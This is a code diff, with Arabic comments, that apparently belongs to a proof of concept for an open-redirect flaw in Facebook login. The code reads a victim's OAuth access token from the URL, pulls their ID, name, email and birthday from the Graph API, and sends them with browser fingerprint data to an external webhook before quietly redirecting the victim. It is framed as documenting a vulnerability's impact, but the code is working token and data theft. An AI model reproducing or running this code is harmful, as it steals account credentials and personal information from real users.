@@ -12,26 +12,26 @@
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
 
                 try {
-                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
+                    // سحب الـ ID والبريد والاسم (كما فعل صمودة في خطوته الأولى)
+                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday&access_token=${token}`);
                     const userData = await response.json();
 
-                    // إرسال الـ ID بشكل منفصل وواضح جداً في أعلى السجل
-                    const exfil = new Image();
-                    exfil.src = `${webhookUrl}?FOUND_ID=${userData.id}&USER=${encodeURIComponent(userData.name)}`;
+                    // إرسال الـ ID بوضوح (920929380607450) لتوثيقه
+                    new Image().src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;
 
-                    // إرسال البيانات الكاملة كـ POST لتوثيق الثغرة
+                    // محاولة سحب معلومات الجهاز (Fingerprinting)
                     await fetch(webhookUrl, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            alert: "Open Redirect Impact Confirmed",
+                            impact: "Account Information Leak",
                             facebook_id: userData.id,
-                            email: userData.email,
-                            full_response: userData
+                            full_profile: userData,
+                            browser: navigator.userAgent
                         })
                     });
 
-                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1500);
+                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                 } catch (e) {
                     window.location.href = "https://www.facebook.com/me";
                 }
